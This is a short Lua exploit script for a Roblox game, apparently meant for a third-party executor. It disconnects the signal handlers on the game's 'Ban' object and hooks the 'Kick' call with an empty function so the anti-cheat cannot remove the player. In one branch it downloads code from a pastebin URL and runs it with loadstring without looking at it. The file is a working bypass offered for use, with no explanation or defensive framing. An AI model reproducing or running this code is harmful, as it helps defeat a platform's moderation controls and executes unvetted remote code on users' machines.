local getconnections = get_signal_cons or getconnections
if getconnections then
  if game.ReplicatedStorage.Interaction:FindFirstChild("Ban") then
    for i, v in pairs(getconnections(game.ReplicatedStorage.Interaction:FindFirstChild("Ban").AncestryChanged)) do
      v:Disconnect()
    end
  end
else
  if not getgenv().MTAPIMutex then loadstring(game:HttpGet("https://pastebin.com/raw/UwFCVrhS", true))() end
  game:AddGlobalCallHook("Kick", function(t,...)
  end)
end
